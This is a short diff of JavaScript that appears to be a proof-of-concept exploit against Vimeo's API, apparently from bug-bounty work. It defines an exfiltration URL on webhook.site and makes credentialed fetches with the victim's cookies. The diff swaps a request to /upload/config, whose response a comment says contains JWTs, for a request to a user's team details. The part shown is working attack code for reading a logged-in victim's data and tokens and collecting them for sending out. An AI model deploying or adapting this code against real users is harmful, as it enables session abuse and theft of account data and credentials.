@@ -11,7 +11,7 @@
     const exfil = "https://webhook.site/7555a2ac-0fed-40dc-85c0-92c6a867ac65"; // replace with your endpoint
 
     // Step 1: fetch /upload/config with victim's credentials
-    fetch("https://api.vimeo.com/upload/config", { credentials: "include" })
+    fetch("https://api.vimeo.com/users/244943635/teams?&fields=current_team_size,owner.account,owner.name,owner.uri,team_data.team_name,untranslated_user_role", { credentials: "include" })
       .then(r => r.json())
       .then(data => {
         // Show raw config response (contains JWTs)
